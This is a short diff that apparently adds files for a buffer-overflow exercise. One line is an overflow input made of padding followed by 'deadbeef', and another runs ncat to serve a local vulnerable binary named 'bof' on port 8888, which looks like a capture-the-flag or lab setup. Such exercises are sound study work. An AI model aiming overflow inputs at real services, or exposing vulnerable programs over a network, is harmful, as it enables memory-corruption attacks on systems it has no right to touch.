@@ -1,0 +1,6 @@
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadeadbeef
+
+
+
+
+ncat -vc ./bof -kl localhost 8888
